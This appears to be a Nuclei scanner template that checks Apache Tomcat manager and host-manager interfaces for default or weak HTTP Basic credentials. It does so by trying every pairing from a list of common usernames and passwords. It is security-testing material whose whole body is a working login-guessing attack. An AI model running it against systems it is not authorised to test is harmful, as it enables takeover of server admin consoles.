id: apache-tomcat-admin-default-credentials

info:
  name: Apache Tomcat Admin Interfaces Default Credentials
  author: scan-nuclei
  severity: critical
  description: |
    Attempts common default and weak credentials against Tomcat admin interfaces
    protected with HTTP Basic authentication.
  tags:
    - apache-tomcat
    - tomcat
    - default-login
    - basic-auth
    - manager
    - host-manager

http:
  - method: GET
    path:
      - "{{BaseURL}}/manager/html"
      - "{{BaseURL}}/host-manager/html"
      - "{{BaseURL}}/manager/text/list"

    attack: clusterbomb
    payloads:
      username:
        - tomcat
        - admin
        - manager
        - role1
        - both
        - root
        - user
      password:
        - tomcat
        - admin
        - manager
        - role1
        - both
        - s3cret
        - root
        - password
        - changeme

    headers:
      Authorization: "Basic {{base64(username + ':' + password)}}"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "!contains(to_lower(all_headers), 'www-authenticate')"
      - type: regex
        part: body
        condition: or
        regex:
          - "(?i)Tomcat Web Application Manager"
          - "(?i)Tomcat Virtual Host Manager"
          - "(?m)^OK - Listed applications for virtual host"
